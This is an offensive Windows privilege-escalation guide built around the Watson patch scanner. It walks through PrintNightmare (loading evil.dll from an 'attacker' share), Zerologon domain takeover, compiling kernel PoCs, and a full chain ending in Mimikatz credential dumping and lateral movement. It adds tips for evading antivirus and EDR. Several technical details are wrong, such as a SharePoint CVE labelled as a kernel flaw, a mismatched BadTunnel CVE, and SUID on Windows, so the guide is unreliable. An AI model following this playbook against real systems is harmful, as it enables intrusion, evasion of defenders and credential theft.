# Watson Patch Analysis & Exploitation Workflow

## Typical Watson Output

```
[+] System: Windows 10 Build 19045
[+] Last update: 2025-01-15
[+] KB: KB5037765

[!] Missing patches:
  CVE-2021-34527 (PrintNightmare) — KB5005010
  CVE-2021-33771 (Windows Kernel) — KB5004442
  CVE-2020-1472 (Zerologon) — KB4564890
```

---

## Exploitation Workflow

### Step 1: Identify Missing Patches

```powershell
# Run Watson:
.\watson.exe

# Or get patch list manually:
Get-HotFix | Select HotFixID

# Compare against Watson output for gaps
```

### Step 2: Map CVE to Exploitation Difficulty

| CVE | Patch | Difficulty | Impact |
|---|---|---|---|
| **PrintNightmare (CVE-2021-34527)** | KB5005010 | 🟢 Easy | RCE as SYSTEM |
| **Zerologon (CVE-2020-1472)** | KB4564890 | 🟡 Medium | Domain compromise |
| **Eternal Blue (CVE-2017-0144)** | KB4013389 | 🟢 Easy | RCE as SYSTEM |
| **BadTunnel (CVE-2016-3309)** | KB3156059 | 🟡 Medium | Lateral movement |
| **Kernel Privilege Escalation** | Various | 🔴 Hard | Depends on CVE |

---

## PrintNightmare (CVE-2021-34527) - High Impact Example

### Identification

Watson output:
```
[!] CVE-2021-34527 (PrintNightmare) — CRITICAL
    Affected: Windows 7, 8.1, 10, Server 2012-2019
    Missing KB: KB5005010
```

### Exploitation

**1. Via Point & Print (RCE)**

```powershell
# Vulnerable if:
# - Print Spooler service running
# - CVE-2021-34527 patch missing

# PoC (C#):
# Compile + run on vulnerable system
# Syntax: PrintNightmare.exe "\\attacker\share\evil.dll" "C:\Windows\System32"

# Result: Arbitrary DLL injection → SYSTEM RCE
```

**2. Local Privilege Escalation**

```powershell
# If logged in as non-admin:
# 1. Find vulnerable print driver
# 2. Replace driver file
# 3. Restart spooler
# 4. Gain SYSTEM privileges
```

**3. Detection:**

```powershell
# Check if Print Spooler running:
Get-Service -Name Spooler

# Check if patch is installed:
Get-HotFix -Id KB5005010

# If no KB5005010: VULNERABLE
```

---

## Zerologon (CVE-2020-1472) - Domain Impact

### Identification

Watson output:
```
[!] CVE-2020-1472 (Zerologon) — CRITICAL
    Affected: Windows Server 2012-2019, DC
    Missing KB: KB4564890
```

### Exploitation

```powershell
# If DC is missing KB4564890:
# Can reset DC computer account password → full domain takeover

# PoC workflow:
# 1. Reset DC machine account ($)
# 2. Perform DCSync
# 3. Extract KRBTGT hash
# 4. Create golden ticket
# 5. Persistent domain control
```

---

## Kernel Exploitation via Watson

Watson identifies kernel vulnerabilities:

```
[!] Kernel CVE-2019-0604 — Missing KB4489873
    Affects Windows 7 SP1, Server 2008 R2
    Local Privilege Escalation
```

### Exploitation Steps

1. **Identify vulnerable kernel version:**
   ```powershell
   systeminfo | findstr /B /C:"OS Version"
   # OS Version: Windows 7 Service Pack 1
   ```

2. **Check specific patch:**
   ```powershell
   Get-HotFix -Id KB4489873
   # Not found → VULNERABLE
   ```

3. **Find PoC:**
   - Exploit-DB
   - GitHub (search: `CVE-YYYY-NNNNN kernel exploit`)
   - Metasploit: `search CVE-YYYY-NNNNN`

4. **Compile & run:**
   ```powershell
   # Download PoC (e.g., C source)
   # Compile with MinGW or VS:
   gcc -o exploit.exe exploit.c
   
   # Run:
   .\exploit.exe
   
   # Result: SYSTEM shell
   ```

---

## Comparison with WinPEAS

| Tool | Finds | Typical User Impact |
|---|---|---|
| **Watson** | Missing patches → Known CVEs | Kernel exploits, PrintNightmare, etc |
| **WinPEAS** | Misconfigurations → Custom exploits | Weak services, SUID, DLL hijacking |

**Combined Usage:**
```
Watson finds: CVE-2021-34527 (PrintNightmare)
WinPEAS finds: Unquoted service paths

Both exploitable → Choose easier path
```

---

## Patch Analysis Methodology

### 1. Extract Patch History

```powershell
# List all patches:
Get-HotFix | Select HotFixID, InstalledOn | Sort-Object InstalledOn -Descending

# Or via WMI:
wmic qfe list brief /format:list
```

### 2. Map to Known Vulnerabilities

```powershell
# For each missing patch, check CVE database:
# https://cve.mitre.org/
# https://nvd.nist.gov/

# Or use Watson to automate:
.\watson.exe
```

### 3. Assess Exploitation Difficulty

| Category | Difficulty | Priority |
|---|---|---|
| **Pre-Auth RCE** | Low | Critical |
| **Unauthenticated SYSTEM** | Low-Medium | Critical |
| **Local Priv Escalation** | Medium | High |
| **Domain Compromise** | High | Critical |
| **Configuration Bypass** | Medium | Medium |

---

## OPSEC Considerations

⚠️ **Watson may be detected by:**
- Antivirus (signature detection of Watson binary)
- EDR (behavioral detection of CVE checking)
- Firewall (DNS/HTTP for CVE lookup)

✅ **Stealth options:**
1. **Run offline:**
   - Download patch list before execution
   - Compare locally without network

2. **Use WMI instead:**
   ```powershell
   Get-WmiObject -Class Win32_QuickFixEngineering
   # Harder for EDR to flag
   ```

3. **Manual patch checking:**
   ```powershell
   # Less likely to trigger EDR:
   Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | 
       Select DisplayName | grep "KB"
   ```

4. **Avoid known CVEs:**
   - If PrintNightmare PoC is flagged by AV, use kernel exploit instead
   - If service-based exploit detected, pivot to WMI/RPC exploitation

---

## Real-World Scenario

```
Step 1: Gain low-priv user access
        ↓
Step 2: Run Watson (or Get-HotFix)
        ↓
Step 3: Identify CVE-2021-34527 missing
        ↓
Step 4: Check if Print Spooler running
        → YES
        ↓
Step 5: Download PrintNightmare PoC
        ↓
Step 6: Compile & execute
        ↓
Step 7: SYSTEM access achieved
        ↓
Step 8: Dump LSASS (Mimikatz) for creds
        ↓
Step 9: Lateral movement to other machines
```

---

## References

- **NVD CVE Database**: https://nvd.nist.gov/
- **Exploit-DB**: https://www.exploit-db.com/
- **Microsoft Security Updates**: https://msrc.microsoft.com/
- **Watson GitHub**: https://github.com/rasta-mouse/Watson
- **PrintNightmare Resources**: https://github.com/topic/printnightmare
